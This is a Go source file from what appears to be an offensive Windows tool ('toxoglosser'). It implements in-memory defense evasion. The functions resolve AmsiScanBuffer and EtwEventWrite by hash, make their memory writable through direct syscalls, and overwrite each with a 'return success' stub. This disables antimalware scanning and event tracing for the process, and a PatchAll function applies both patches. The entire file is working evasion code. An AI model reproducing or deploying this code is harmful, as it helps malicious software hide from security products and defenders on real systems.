package evasion

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	"toxoglosser/core"
)

// PatchAMSI bypasses AMSI by using direct syscalls and manual API resolution (unhooking approach)
func PatchAMSI() error {
	// Get the address of AmsiScanBuffer using manual resolution instead of LazyDLL
	amsiDll, err := core.GetModuleHandleByHash("amsi.dll")
	if err != nil {
		// If amsi.dll is not present, it's not an error - just means AMSI is disabled
		return nil
	}

	amsiScanBufferAddr, err := core.GetProcAddressByHash(windows.Handle(amsiDll), "AmsiScanBuffer")
	if err != nil {
		// If AmsiScanBuffer is not found, it's not an error - may be different version
		return nil
	}

	// Create a patch that returns S_OK immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute using direct syscalls
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to change memory protection for AMSI patch: %w", err)
	}

	// Write the patch
	copyMemory(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		// Try to return best effort - return the error but don't cause complete failure
		return fmt.Errorf("failed to restore memory protection after AMSI patch: %w", err)
	}

	return nil
}

// PatchETW bypasses ETW by using direct syscalls and manual API resolution (unhooking approach)
func PatchETW() error {
	// Get the address of EtwEventWrite from ntdll using manual resolution
	ntdllModule, err := core.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		return fmt.Errorf("failed to get ntdll module handle: %w", err)
	}

	etwEventWriteAddr, err := core.GetProcAddressByHash(windows.Handle(ntdllModule), "EtwEventWrite")
	if err != nil {
		// If EtwEventWrite is not found, it's not necessarily an error - may be different version
		return nil
	}

	// Create a patch that returns STATUS_SUCCESS immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute using direct syscalls
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to change memory protection for ETW patch: %w", err)
	}

	// Write the patch
	copyMemory(unsafe.Pointer(etwEventWriteAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to restore memory protection after ETW patch: %w", err)
	}

	return nil
}

// copyMemory copies memory from source to destination
func copyMemory(dst, src unsafe.Pointer, length int) {
	for i := 0; i < length; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dst) + uintptr(i))) = *(*byte)(unsafe.Pointer(uintptr(src) + uintptr(i)))
	}
}

// PatchAll in-memory protections at once
func PatchAll() error {
	var allErrors []error

	// Patch AMSI first
	err := PatchAMSI()
	if err != nil {
		allErrors = append(allErrors, fmt.Errorf("AMSI patching failed: %w", err))
	}

	// Patch ETW
	err = PatchETW()
	if err != nil {
		allErrors = append(allErrors, fmt.Errorf("ETW patching failed: %w", err))
	}

	// If there were any errors, return them
	if len(allErrors) > 0 {
		// Return the first error for simplicity, in a more complex implementation
		// you might want to return a multi-error
		return allErrors[0]
	}

	return nil
}